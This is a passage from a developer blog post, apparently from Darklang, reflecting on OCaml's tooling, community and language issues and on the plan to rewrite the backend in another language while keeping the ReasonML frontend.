Opam, Dune, and Esy, to be able to get something working (you could also do it without Esy and just rely on Opam, but that's much worse). I talked about a bunch of these challenges <a href="https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/">here</a>.</p><h2 id="language-problems">Language problems</h2><p>Multicore is coming Any Day Now™️, and while this wasn't a huge deal for us, it was annoying. </p><h2 id="minor-annoyances">Minor annoyances</h2><p>One of my biggest annoyances was how often OCaml folks talk about Fancy Type System problems, instead of how to actually build products and applications. In other communities for similar languages (ReasonML, Elm, F#), people talk about building apps and solving their problems. In OCaml, it feels like people spend an awful lot of time discussing Functors. It's not quite at the level that I perceived in the Haskell world, but it pointed out that the people building the core of the ecosystem do not have the same problems that I do (which is building web-y stuff).</p><p>I honestly think OCaml was a great choice at the start. Being able to quickly and safely make large-scale changes to your app is something that staticly-typed functional languages excel at. I'm happy that we made the choice, and in retrospect, it still seems like the best choice of those we had at the time.</p><p>I'm working on building the next version of the backend. We have about 20k lines to be replaced, and they'll be rewritten in a new language while keeping the semantics the same. I plan to leave keep the frontend in ReasonML: it doesn't suffer from the same library problems as it can interface nicely to JS, and it's nearly 50k lines of code so it would be a much bigger undertaking.</p><p>Read <a href="https://blog.darklang.com/new-backend-fsharp/">the followup</a> to see what we picked!</p><hr><p><em><em><em><em><em><em><em><em>You can sign up for Dark </em></em></em></em></em></em></em></em><a href="https://darklang.com/signup" rel="noopener nofollow"><em><em><em><em><em><em><em><em>here</em></em></em></em></em></em></em></em></a><em><em><em><em><em><em><em><em>.
